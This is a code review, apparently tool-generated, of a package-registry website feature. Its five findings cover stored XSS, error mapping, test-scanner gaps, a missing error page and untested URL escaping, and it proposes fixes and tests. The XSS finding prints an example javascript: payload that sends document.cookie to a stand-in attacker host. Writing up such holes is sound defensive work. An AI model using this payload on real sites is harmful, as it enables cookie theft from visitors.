# registry-website-phase2 — Review

> Produced by `/feature-review`. One finding per H2 section.
> Each finding header MUST be parseable: `## Fxx — [SEVERITY] short title`.
> `/resolve <feature> Fxx [Fyy...]` reads the selected section(s) and dispatches a Resolver.

**Scope reviewed:** commits `0d78f4a8..f665165e` on branch `feature/registry-website-phase2`
**Brief:** ../brief.md
**Generated:** 2026-06-04

**Headline read.** The feature ships its load-bearing surfaces — README chokepoint (Markdig `DisableHtml()` → HtmlSanitizer with a tight scheme+tag allow-list), the no-`Stash.Registry`-dependency architecture guard (reflection + csproj-parse, both with binding floors and fail-path fixtures), and the field-discipline scan over rendered HTML — and the meta-tests are non-vacuous in the ways that matter. Two real issues remain: (1) the `Repository` URL bound directly into an `<a href>` is a stored-XSS sink that bypasses the README chokepoint entirely (Razor encodes attribute values but does **not** scheme-validate, so a package-authored `javascript:` URI is clickable), and (2) the spec's "registry 400 → website 400" error mapping was never implemented — 400s currently fall through the generic `catch (Exception)` arm and surface as misleading 502 "registry unreachable" pages, which is user-reachable today via `?pageSize=99999`. Plus minor: two narrow gaps in the chokepoint scanner's reach (per-line regex, declared-type-only model check), and an `/Error` page that doesn't exist behind `UseExceptionHandler("/Error")`.

---

## F01 — [CRITICAL] Stored XSS via package-authored `repository` URL in sidebar

**Status:** fixed
**Fixed in:** cbe7b774
**Files:** `Stash.Registry.Web/Views/PackageSidebar.cshtml:43`
**Phase:** P4
**Commit:** 8383de24

### Observation

`PackageSidebar.cshtml` renders the package-authored `repository` URL as a clickable link with no scheme validation:

```cshtml
<a href="@Model.Repository" target="_blank" rel="noopener noreferrer">@Model.Repository</a>
```

`PackageDetailResponse.Repository` is package metadata copied verbatim from the published manifest (`Stash.Registry/Services/PackageService.cs:176` → `Repository = manifest.Repository`); the registry performs **no URL-scheme validation** on the manifest field (`Stash.Core/Common/PackageManifest.cs:102` declares it as a free-form `string?`, and there is no validator under `Stash.Registry/Validation/`). A malicious publisher can therefore set `repository: "javascript:fetch('https://evil.example/'+document.cookie)"` (or any payload of their choosing); Razor's attribute encoder converts characters like `"` and `&` but leaves the `javascript:` scheme untouched — clicking the link executes script in the website's origin.

The README chokepoint (Markdig `DisableHtml()` + `HtmlSanitizer.AllowedSchemes = {http,https,mailto}`) is the **only** defense against `javascript:`/`data:` URIs in the project, and it runs over README content only — it never sees the sidebar's href.

I scanned every `href="@…"` site in the project (`grep -rn 'href="@' Stash.Registry.Web/`) — `Repository` is the **only** sink where a package-authored URL flows into an href. All other matches (`detailUrl`, `BuildPageUrl`, `PackageDetailUrl`, `altHref`) are server-constructed and rooted with `/` (or the `/search?q=` escape-encoded path), so the scheme is fixed by construction.

### Why this matters

The brief states explicitly: "Treat all package-authored content (README, description, keywords) as hostile input" and the Cross-Cutting Concerns table designates the README chokepoint as the chosen defense — but the same hostile-input invariant applies to *any* package-authored URL the site interpolates into HTML, not only the README. The actual mechanics:

- **Trigger:** click — `javascript:` URIs execute on user interaction (page load is not enough). `data:` URIs in top-level navigation are blocked by all current browsers, leaving `javascript:` as the live vector.
- **Audience:** every anonymous visitor of `/packages/@scope/name` for a malicious package. No login required, no CSRF token to defeat — the site is anonymous browse-only.
- **Impact:** the site has no sessions/cookies/JWT to steal, so the realistic harm is origin-script execution → phishing redirect, drive-by malware, defacement, and exfiltration of any future origin-scoped state the website grows. It still **defeats the feature's central security promise** ("the README chokepoint is the only `@Html.Raw` site, everything else is default-encoded") because the attacker doesn't need `@Html.Raw` at all — they reach into an attribute encoder that doesn't scheme-validate.

This is the kind of class of bug that should be impossible by **construct** in a project that loudly advertises a chokepoint pattern.

### Suggested fix

Defense lives in the website (per the brief's "hostile input" framing — the registry is a candidate too but shipping a fix there would require backfill for any future deployed instance; the website is the canonical render-time gate). Add a tiny helper and bind through it:

```cs
// Stash.Registry.Web/Rendering/SafeUrl.cs
public static class SafeUrl
{
    private static readonly HashSet<string> AllowedSchemes =
        new(StringComparer.OrdinalIgnoreCase) { "http", "https", "mailto" };

    /// <summary>Returns <paramref name="url"/> if it is an absolute http(s)/mailto URL; else null.</summary>
    public static string? AllowExternal(string? url)
    {
        if (string.IsNullOrWhiteSpace(url)) return null;
        if (!Uri.TryCreate(url, UriKind.Absolute, out var uri)) return null;
        return AllowedSchemes.Contains(uri.Scheme) ? url : null;
    }
}
```

Then in `PackageSidebar.cshtml`:

```cshtml
@{
    var safeRepo = Stash.Registry.Web.Rendering.SafeUrl.AllowExternal(Model.Repository);
}
@if (safeRepo is not null)
{
    <div class="sidebar-meta-item">
        <dt class="sidebar-meta-label">Repository</dt>
        <dd class="sidebar-meta-value">
            <a href="@safeRepo" target="_blank" rel="noopener noreferrer">@Model.Repository</a>
        </dd>
    </div>
}
else if (!string.IsNullOrWhiteSpace(Model.Repository))
{
    <div class="sidebar-meta-item">
        <dt class="sidebar-meta-label">Repository</dt>
        <dd class="sidebar-meta-value">@Model.Repository</dd>  @* rendered as plain text — Razor encoding handles &, <, etc. *@
    </div>
}
```

Tests to add in `ReadmeRendererTests.cs` (or a new `SafeUrlTests.cs`): `javascript:`, `data:`, `vbscript:`, `file:`, scheme-less paths, empty/null, plus `http://`, `https://`, `mailto:` round-trips. Also add an integration test in `PackagePageTests.cs` that stubs a `Repository = "javascript:alert(1)"` and asserts `Assert.DoesNotContain("href=\"javascript:", html)`.

Optional hardening (separate finding-of-finding worthy of a backlog stub, not blocking this fix): apply the same `SafeUrl` gate at the registry's publish path so bad URLs never enter storage — but the website remains the right *render-time* gate since policy can shift faster than data.

### Verify

```
dotnet test --filter "FullyQualifiedName~Registry.Web"
```

---

## F02 — [IMPORTANT] Registry 400 errors collapse to website 502 — acceptance criterion unmet

**Status:** fixed
**Fixed in:** 932c0e03
**Files:** `Stash.Registry.Web/Pages/Search.cshtml.cs:92-113`, `Stash.Registry.Web/Pages/Package.cshtml.cs:155-164`, `Stash.Registry.Web/Pages/Version.cshtml.cs:86-95`
**Phase:** P3, P4, P6
**Commit:** f06ffda7, 8383de24, bfc5009a

### Observation

The brief specifies the error mapping in two places:

- **Design > Semantics > Error mapping** — "Registry 400 (e.g. bad `sort=`) → website 400 with the validation message bubbled up."
- **Acceptance Criteria > Error behavior** — "A request with `sort=downloads` (Bucket-B value the registry rejects) bubbles up the registry's 400 InvalidRequest message."

Every page model implements the catch ladder as:

```cs
catch (RegistryClientException ex) when ((int)ex.StatusCode >= 500) { /* 502 */ }
catch (RegistryClientException ex) when (ex.StatusCode == HttpStatusCode.NotFound) { /* 404/empty */ }   // Search/Index only
catch (Exception) { /* 502 "registry unreachable" */ }
```

A `RegistryClientException` carrying a 400 does **not** match any specific filter — it lands in the generic `catch (Exception)` arm and surfaces as **502 "The package registry is currently unreachable."** The 400 message that the client *already parsed* (`RegistryClientException.ErrorMessage`, set in `HttpRegistryClient.ThrowRegistryExceptionAsync:97`) is discarded.

The brief's literal example (`sort=downloads`) is intercepted *earlier* by Razor model binding — `SearchModel.Sort` is typed `PackageSortOrder`, so an unknown enum string coerces to the default `Relevance` and the request 200s without ever reaching the registry. So that specific example happens to be inert; the **real** user-reachable trigger is `?pageSize=99999` (or `?page=-1` etc.):

- `Search.cshtml.cs:73-74` only clamps `Page < 1 → 1` and `PageSize < 1 → 20`; **there is no upper cap.** `PageSize = 99999` is forwarded to the registry verbatim.
- `Stash.Registry.Contracts.PagingLimits.MaxPageSize == 100` (the brief notes this in Design > Semantics > Pagination); the registry rejects with **400 InvalidRequest**.
- The website's catch ladder maps that to "registry is currently unreachable" — a diagnostic that is both **wrong** (the registry is fine; the *request* is bad) and operationally misleading (users will report registry outages that aren't real).

### Why this matters

This is a **brief-parity miss**: an acceptance-criterion item that wasn't implemented and wasn't caught by any test (no `PackagePageTests`/`SearchPageTests`/`VersionPageTests` case asserts the 400 path). The misclassification has a real user cost — visitors who pass an out-of-range query parameter see a "registry unreachable" page instead of "your query was invalid because pageSize must be ≤ 100", and an operator who acts on that 502 will look at a healthy registry. The brief explicitly anticipated this in Pagination: "The page-size cap (`PagingLimits.MaxPageSize == 100`) is honored implicitly because the registry rejects out-of-range values."

The fix is small (`RegistryClientException` already carries the 400 message — no new plumbing) and the test gap is equally small (one xUnit case per page).

### Suggested fix

Insert a 400 arm above the catch-all in all three page models:

```cs
catch (RegistryClientException ex) when ((int)ex.StatusCode == 400)
{
    Response.StatusCode = StatusCodes.Status400BadRequest;
    RegistryError = ex.ErrorMessage ?? "The request was invalid.";  // already parsed from the registry's ErrorResponse JSON
}
```

(For `SearchModel`, surface `RegistryError` the way the existing 5xx branch does; the view already renders it as an `alert alert-error` banner. Same for `PackageModel` and `VersionModel`.)

Distinguish the wording in views (`RegistryError` vs. e.g. `ValidationError`) so the "Registry Unavailable" heading on the package/version error pages doesn't appear for a user-input 400 — a short inline alert with the message is enough. Either reuse `RegistryError` and gate the heading on `Response.StatusCode != 400`, or add a second `ValidationError` property; the latter is the cleaner shape.

Tests in `SearchPageTests.cs` / `PackagePageTests.cs` / `VersionPageTests.cs`:

```cs
[Fact]
public async Task SearchPage_RegistryReturns400_Returns400WithMessage()
{
    var stub = new StubRegistryClient
    {
        SearchException = new RegistryClientException(
            HttpStatusCode.BadRequest, "InvalidRequest", "pageSize must be at most 100."),
    };
    using var factory = CreateFactory(stub);
    using var client = factory.CreateClient();

    var response = await client.GetAsync("/search?q=x&pageSize=99999");

    Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
    var html = await response.Content.ReadAsStringAsync();
    Assert.Contains("pageSize must be at most 100.", html);
}
```

(Optional secondary fix: cap `SearchModel.PageSize` client-side at `PagingLimits.MaxPageSize` so the round-trip succeeds for honest clients too — but that does not relieve the 400 mapping, which any other validator-bounded field can still trigger.)

### Verify

```
dotnet test --filter "FullyQualifiedName~SearchPageTests|FullyQualifiedName~PackagePageTests|FullyQualifiedName~VersionPageTests"
```

---

## F03 — [MINOR] Chokepoint scanner has two narrow blind spots

**Status:** open
**Files:** `Stash.Tests/Registry/Web/ReadmeChokepointMetaTests.cs:83-118`, `:126-167`
**Phase:** P5
**Commit:** 6f40b2ec

### Observation

The chokepoint scan (`ScanFileForViolations`) is sound for the current shape of the project but has two specific gaps that a future change could land in without tripping the guard. Neither is a live vulnerability today — the production `Package.cshtml` write is correct — they're regression-guard weaknesses.

1. **Per-line regex.** `ScanFileForViolations` reads `File.ReadAllLines(cshtmlPath)` and runs the regex on each line independently. `HtmlRawPattern` carries `RegexOptions.Singleline` (which only affects `.`), but each input is one line. A multi-line invocation like:

   ```cshtml
   @Html.Raw(
       someUnsafeExpression
   )
   ```

   Razor accepts this; the scanner sees three lines that each match nothing, and the violation slips through.

2. **Safe-form-2 checks declared type only, not provenance.** `IsHtmlStringModelProperty` resolves the model property and asserts its declared type is `HtmlString` (or `HtmlString?`). It does **not** verify that the value was produced by `IReadmeRenderer.RenderToSafeHtml`. A future model could declare `public HtmlString Evil => new HtmlString(userInput);` and a view `@Html.Raw(Model.Evil)` would pass the scan despite assembling raw HTML from a string. The brief's chokepoint pattern is explicitly "populated **only** from the renderer" — the scanner enforces the type half but not the source half.

### Why this matters

Both gaps are *bypass* paths, not currently-exploited holes. The teeth-self-tests cover the cases the production scanner *does* handle (rogue single-line `@Html.Raw(someString)`, safe single-line property and renderer call) and the production write is correct. But "the chokepoint scan is the load-bearing invariant" is exactly the case where the guard should be tightened so the security property doesn't quietly drift across phases.

Cost of fixing is small (gap 1 is a regex tweak; gap 2 needs analysis of the property body) — and given the scanner already has comprehensive teeth tests for what it does cover, plugging these will not silently weaken anything.

### Suggested fix

**Gap 1 — multi-line.** Read the file as one string and let `RegexOptions.Singleline` do its job. The regex itself already uses non-greedy `.+?\)`. Switch to:

```cs
internal static IReadOnlyList<string> ScanFileForViolations(string cshtmlPath)
{
    var content = File.ReadAllText(cshtmlPath);
    var violations = new List<string>();
    foreach (Match match in HtmlRawPattern.Matches(content))
    {
        // ... existing safe-form checks ...
        // Compute line number for the diagnostic:
        int lineIdx = content[..match.Index].Count(c => c == '\n');
        violations.Add($"{Path.GetFileName(cshtmlPath)}:{lineIdx + 1}: ...");
    }
    return violations;
}
```

Add a self-test that drops a multi-line `@Html.Raw(\n  someUserString\n)` snippet into a temp file and asserts the scanner flags it.

**Gap 2 — provenance.** A Roslyn-source scan over the matching `.cshtml.cs` for the property's getter, asserting it returns the result of a `RenderToSafeHtml(...)` call (or is set only by an assignment from `RenderToSafeHtml(...)`), is the principled fix; for the smaller-blast version, accept "approved property names" tracked in the test (currently `ReadmeHtml` is the only one) and refuse `@Html.Raw(Model.X)` unless `X` is on the allow-list. The allow-list approach is one line and ages fine for a project with one chokepoint; the Roslyn approach scales if the surface grows. Pick the lighter for Phase 2 and note the upgrade path.

### Verify

```
dotnet test --filter "FullyQualifiedName~ReadmeChokepointMetaTests"
```

---

## F04 — [MINOR] `UseExceptionHandler("/Error")` references a page that does not exist

**Status:** fixed
**Fixed in:** 932c0e03
**Files:** `Stash.Registry.Web/Program.cs:30-33`
**Phase:** P1
**Commit:** fdec81d1

### Observation

`Program.cs` registers a production-only exception handler:

```cs
if (!app.Environment.IsDevelopment())
{
    app.UseExceptionHandler("/Error");
}
```

No `Pages/Error.cshtml` (or `Pages/Error.cshtml.cs`) exists in the project. In Development the handler is bypassed (developer exception page), so `WebApplicationFactory`-driven tests never exercise this branch and it goes unnoticed by the green gate.

In a production deployment (`ASPNETCORE_ENVIRONMENT=Production`), any unhandled exception triggers a re-execute to `/Error`; ASP.NET's routing returns 404 for that path, which then causes the exception middleware to give up and surface a bare 500 response with the original exception's path masked. It is not a security hole — it just makes the worst-case error path uglier and noisier than intended.

### Why this matters

The website's error story is otherwise well-defined (`PackageNotFound`, `RegistryError`, `VersionNotFound`) — the production unhandled-exception path is the one corner that's wired-but-unimplemented. Catching this before the first prod deploy is cheaper than after the first stack trace ends up in the wrong log.

### Suggested fix

Either:

- Add a minimal `Pages/Error.cshtml` + `Error.cshtml.cs` that renders a generic "Something went wrong" page (the standard ASP.NET template — `Microsoft.AspNetCore.Diagnostics` ships an example). Or
- Remove the `UseExceptionHandler("/Error")` line until Phase 3 ships a real error page; the developer exception page in Development is already the right behavior, and bare 500s in early production are an acceptable placeholder.

Pick one consciously — the current state is the worst of both (configured handler, no implementation).

### Verify

```
dotnet build Stash.sln
dotnet test --filter "FullyQualifiedName~Registry.Web"
```

(No test today covers this; consider adding a `Production`-environment WebApplicationFactory test that triggers a fault in a page handler and asserts the response is HTML, not a bare 500 trace.)

---

## F05 — [MINOR] Per-segment `Uri.EscapeDataString` is implemented but never test-verified

**Status:** open
**Files:** `Stash.Tests/Registry/Web/HttpRegistryClientTests.cs`
**Phase:** P4
**Commit:** 8383de24

### Observation

Phase P4's `done_when` includes:

> "The two-segment scoped route resolves correctly: the `@` is in the URL template, the registry HTTP call uses `/api/v1/packages/{scope}/{name}` (no `@`), and `Uri.EscapeDataString` is applied to each segment before the call."

The implementation is correct (`HttpRegistryClient.Seg(...)` wraps every path segment in `GetPackageAsync`, `GetVersionsAsync`, `GetReadmeAsync`, `GetVersionAsync`) — but no test asserts it. `HttpRegistryClientTests` only checks that the path *contains* `my-org` and `my-lib`, which passes whether or not escaping is applied.

A regression that drops the escape (e.g. someone inlining the format string while refactoring) is not caught by any current test. The integration `PackagePageTests` use plain ASCII segments throughout, so they don't exercise the escape either.

### Why this matters

This is the kind of brief-parity item that *should* have a test — the per-segment escape is a security-adjacent decision (preventing scope/name values from corrupting the registry's path interpretation) and the brief specifically calls it out. Tests are cheap; the regression cost (silent path corruption on unusual but legal scope/name values, or a future scope that includes `%`/`+`) is non-trivial.

### Suggested fix

Add one parameterized xUnit case per nullable method in `HttpRegistryClientTests`:

```cs
[Theory]
[InlineData("my-org",   "my-lib",      "/api/v1/packages/my-org/my-lib")]
[InlineData("scope+",   "name space",  "/api/v1/packages/scope%2B/name%20space")]
[InlineData("a%b",      "c/d",         "/api/v1/packages/a%25b/c%2Fd")]
public async Task GetPackageAsync_EscapesEachSegment(string scope, string name, string expectedPath)
{
    var (client, stub) = BuildClient(new HttpResponseMessage(HttpStatusCode.NotFound));
    await client.GetPackageAsync(scope, name);
    Assert.Equal(expectedPath, stub.LastRequest!.RequestUri!.AbsolutePath);
}
```

(Repeat for `GetVersionsAsync`, `GetReadmeAsync`, `GetVersionAsync`.)

### Verify

```
dotnet test --filter "FullyQualifiedName~HttpRegistryClientTests"
```
